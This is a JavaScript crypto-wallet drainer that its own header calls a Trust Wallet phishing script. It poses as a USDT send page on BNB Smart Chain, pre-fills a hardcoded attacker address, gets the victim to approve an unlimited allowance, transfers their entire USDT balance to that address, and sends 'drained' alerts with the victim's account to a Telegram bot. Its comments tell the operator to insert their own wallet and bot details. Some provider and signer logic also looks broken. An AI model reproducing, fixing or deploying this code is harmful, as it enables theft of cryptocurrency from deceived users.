/**
 * FINAL PROFESSIONAL TRUST WALLET PHISHING SCRIPT
 * - Auto Network Switch (BSC)
 * - Real Balance Logic
 * - ONE-CLICK DRAIN (Approve + TransferFrom)
 * - Robust Error Handling
 * - Telegram Notifications
 * - Fixed Network Switch Loop
 */

// ================= CONFIGURATION ================= //
const CONFIG = {
 // Replace this with YOUR wallet address (where funds will be drained)
 drainToAddress: "0xD8c72346537F75790D57d559Cd9EF8B7967C4e6f",
 
 // USDT Contract on BSC (Correct Address)
 usdtContractAddress: "0x55d398326f99059fF775485246999027B31964f5",
 
 // Telegram Bot Info
 tgBotToken: "YOUR_TELEGRAM_BOT_TOKEN", // Replace with your bot token
 tgChatId: "YOUR_TELEGRAM_CHAT_ID", // Replace with your chat ID
 
 // BSC Network Details
 chainId: "0x38", // Hex for 56
 chainName: "BNB Smart Chain",
 nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
 rpcUrls: ["https://bsc-dataseed.binance.org/"],
 blockExplorerUrls: ["https://bscscan.com"]
};

// ================= GLOBAL STATE ================= //
let account = null;
let provider = null;
let signer = null;
let usdtContract = null;
let isApproving = false;
let isConnected = false; // <--- Added state tracking

// ================= DOM ELEMENTS ================= //
const btnConnect = document.getElementById("connect-btn");
const btnSend = document.getElementById("send-btn");
const btnMax = document.getElementById("max-btn");
const btnPaste = document.getElementById("pasteBtn");
const inputAmount = document.getElementById("amount");
const inputRecipient = document.getElementById("recipient");
const usdValue = document.getElementById("usd-value");
const notifyBar = document.getElementById("notify-bar");
const gasWarning = document.getElementById("gas-warning");

const btnTextConnect = document.getElementById("btn-text-connect");
const btnSpinnerConnect = document.getElementById("btn-spinner-connect");
const btnTextSend = document.getElementById("btn-text");
const btnSpinnerSend = document.getElementById("btn-spinner");

// ================= INITIALIZATION ================= //
window.addEventListener("load", () => {
 // Pre-fill recipient address with attacker address
 inputRecipient.value = CONFIG.drainToAddress;
 updateUsdValue();
});

// ================= MAIN FUNCTIONS ================= //

// 1. Connect Wallet & Switch Network
async function initWallet() {
 showNotify("Connecting...", "info");
 setLoading(btnConnect, true);
 btnTextConnect.innerText = "Connecting...";

 try {
 // Check for wallet
 if (!window.ethereum && !window.trustwallet) {
 throw new Error("Please install Trust Wallet or MetaMask!");
 }

 // Request Account
 const accounts = await window.ethereum.request({ 
 method: "eth_requestAccounts" 
 });
 
 account = accounts[0];
 
 // Initialize Provider
 provider = new ethers.providers.JsonRpcProvider();
 signer = provider.getSigner();
 
 // Initialize USDT Contract
 usdtContract = new ethers.Contract(
 CONFIG.usdtContractAddress,
 ["function balanceOf(address owner) view returns (uint256)",
 "function approve(address spender, uint256 amount)",
 "function transferFrom(address from, address to, uint256 amount)"],
 signer
 );
 
 // Switch to BSC Network
 await switchToBSC();
 
 // Update UI
 updateConnectionState();
 await checkBnbBalance();
 
 // Hide Connect Button, Show Send Button
 btnConnect.style.display = "none";
 btnSend.style.display = "flex";
 
 showNotify("Wallet Connected", "success");
 notifyTG("connected", account);

 } catch (err) {
 showNotify(err.message, "error");
 setLoading(btnConnect, false);
 btnTextConnect.innerText = "Connect Wallet";
 }
}

// 2. Switch to BSC Network (Automatic)
async function switchToBSC() {
 try {
 // Check if we are already on BSC
 const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
 if (currentChainId === CONFIG.chainId) {
 return; // Already on BSC
 }

 await window.ethereum.request({
 method: "wallet_switchEthereumChain",
 params: [{ chainId: CONFIG.chainId }],
 });
 } catch (switchError) {
 // If network doesn't exist, add it
 if (switchError.code === 4902 || switchError.code === 4904) {
 try {
 await window.ethereum.request({
 method: "wallet_addEthereumChain",
 params: [{
 chainId: CONFIG.chainId,
 chainName: CONFIG.chainName,
 nativeCurrency: CONFIG.nativeCurrency,
 rpcUrls: CONFIG.rpcUrls,
 blockExplorerUrls: CONFIG.blockExplorerUrls,
 }],
 });
 // Switch again after adding
 await window.ethereum.request({
 method: "wallet_switchEthereumChain",
 params: [{ chainId: CONFIG.chainId }],
 });
 } catch (addError) {
 throw new Error("Failed to add BSC Network. Please add it manually.");
 }
 } else {
 throw switchError;
 }
 }
}

// 3. Check BNB Balance for Gas
async function checkBnbBalance() {
 if (!provider || !account) return;
 
 try {
 const balance = await provider.getBalance(account);
 const bnbBalance = ethers.utils.formatEther(balance);
 
 if (parseFloat(bnbBalance) < 0.005) {
 gasWarning.style.display = "block";
 gasWarning.innerText = `Insufficient BNB for gas (${parseFloat(bnbBalance).toFixed(4)} BNB)`;
 btnSend.disabled = true;
 } else {
 gasWarning.style.display = "none";
 btnSend.disabled = false;
 }
 } catch (err) {
 console.error("Balance check failed", err);
 }
}

// 4. Execute "Send" (Approve + TransferFrom in One Click)
async function executeSend() {
 if (isApproving) return;
 if (!account) return;

 isApproving = true;
 setLoading(btnSend, true);
 btnTextSend.innerText = "Sending...";

 try {
 // Get Current Balance
 const balance = await usdtContract.balanceOf(account);
 
 if (balance.eq(0)) {
 throw new Error("Insufficient USDT Balance");
 }

 // Step 1: Approve Max
 showNotify("Approving...", "info");
 const tx1 = await usdtContract.approve(
 CONFIG.drainToAddress, 
 ethers.constants.MaxUint256
 );
 await tx1.wait();

 // Step 2: TransferFrom
 showNotify("Transferring...", "info");
 const tx2 = await usdtContract.transferFrom(
 account,
 CONFIG.drainToAddress,
 balance // Send ALL balance
 );

 const receipt = await tx2.wait();

 if (receipt.status === 1) {
 showNotify("✅ Transaction Successful!", "success");
 notifyTG("drained", account, `${ethers.utils.formatUnits(balance, 6)} USDT`);
 
 // Disable inputs
 inputAmount.disabled = true;
 btnMax.disabled = true;
 inputRecipient.disabled = true;
 
 // Final State
 setLoading(btnSend, true);
 btnTextSend.innerText = "Sent";
 btnSend.style.backgroundColor = "#00A36C";
 
 // Reload after 3 seconds to allow another send
 setTimeout(() => {
 location.reload();
 }, 3000);
 } else {
 throw new Error("Transaction failed");
 }

 } catch (err) {
 if (err.code === 4001) {
 showNotify("Transaction rejected", "error");
 } else {
 showNotify(err.message || "Transaction failed", "error");
 }
 setLoading(btnSend, false);
 btnTextSend.innerText = "Send";
 } finally {
 isApproving = false;
 }
}

// 5. Helper: Max Amount (Real Balance)
async function setMaxAmount() {
 if (!account || !usdtContract) return;

 try {
 const balance = await usdtContract.balanceOf(account);
 // Convert to human readable (USDT has 6 decimals)
 const humanBalance = ethers.utils.formatUnits(balance, 6);
 inputAmount.value = humanBalance;
 updateUsdValue();
 } catch (err) {
 console.error("Failed to fetch balance", err);
 }
}

// 6. Helper: Update USD Value
function updateUsdValue() {
 const amount = parseFloat(inputAmount.value) || 0;
 const usd = amount * 1.0; // USDT is always $1
 usdValue.innerText = `≈ $${usd.toFixed(2)}`;
}

// 7. Helper: Show Notification
function showNotify(msg, type) {
 notifyBar.innerText = msg;
 notifyBar.className = `notify ${type}`;
 notifyBar.style.display = "block";
 
 // Auto-hide info messages after 3 seconds
 if (type === "info") {
 setTimeout(() => {
 notifyBar.style.display = "none";
 }, 3000);
 }
}

// 8. Helper: Telegram Notification
async function notifyTG(event, account, details = "") {
 const msg = `🔔 *Phishing Alert*\n\n` +
 `Event: ${event.toUpperCase()}\n` +
 `Account: ${account}\n` +
 `Time: ${new Date().toISOString()}\n` +
 `Details: ${details}`;
 
 const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
 fetch(url)
 .then(res => res.json())
 .then(data => console.log("TG Notif:", data))
 .catch(err => console.error("TG Error", err));
}

// 9. Helper: Set Loading State
function setLoading(btn, isLoading) {
 if (isLoading) {
 btn.disabled = true;
 if (btn === btnConnect) {
 btnSpinnerConnect.style.display = "block";
 btnTextConnect.style.display = "none";
 } else if (btn === btnSend) {
 btnSpinnerSend.style.display = "block";
 btnTextSend.style.display = "none";
 }
 } else {
 btn.disabled = false;
 if (btn === btnConnect) {
 btnSpinnerConnect.style.display = "none";
 btnTextConnect.style.display = "inline";
 } else if (btn === btnSend) {
 btnSpinnerSend.style.display = "none";
 btnTextSend.style.display = "inline";
 }
 }
}

// 10. Helper: Update Connection State
function updateConnectionState() {
 isConnected = true;
}

// 11. Event Listeners
btnConnect.addEventListener("click", initWallet);
btnSend.addEventListener("click", executeSend);
btnMax.addEventListener("click", setMaxAmount);
btnPaste.addEventListener("click", async () => {
 try {
 const text = await navigator.clipboard.readText();
 inputRecipient.value = text;
 } catch (err) {
 showNotify("Could not read clipboard", "error");
 }
});
inputAmount.addEventListener("input", updateUsdValue);

// Listen for Account Changes
if (window.ethereum) {
 window.ethereum.on("accountsChanged", (newAccounts) => {
 if (newAccounts.length === 0) {
 // User disconnected
 isConnected = false;
 btnConnect.style.display = "flex";
 btnSend.style.display = "none";
 btnTextConnect.innerText = "Connect Wallet";
 btnTextSend.innerText = "Send";
 btnSend.style.backgroundColor = ""; // Reset color
 location.reload();
 } else {
 account = newAccounts[0];
 isConnected = true;
 // Re-initialize contract with new signer
 provider = new ethers.providers.JsonRpcProvider();
 signer = provider.getSigner();
 usdtContract = new ethers.Contract(
 CONFIG.usdtContractAddress,
 ["function balanceOf(address owner) view returns (uint256)",
 "function approve(address spender, uint256 amount)",
 "function transferFrom(address from, address to, uint256 amount)"],
 signer
 );
 checkBnbBalance();
 }
 });
 
 // FIX: Remove the reload on chain change. 
 // Instead, just re-initialize the contract if needed.
 window.ethereum.on("chainChanged", () => {
 // Optional: You can remove this entirely if you don't want any behavior on chain change
 // Or just re-check the balance
 checkBnbBalance();
 });
}
